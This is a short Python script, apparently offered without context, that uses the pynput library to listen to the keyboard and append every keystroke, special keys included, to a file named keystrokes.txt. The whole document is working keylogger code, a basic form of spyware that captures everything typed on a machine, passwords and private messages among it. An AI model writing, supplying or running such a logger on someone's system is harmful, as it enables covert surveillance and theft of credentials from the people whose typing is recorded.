from pynput import keyboard

log_file = "keystrokes.txt"
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:  
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
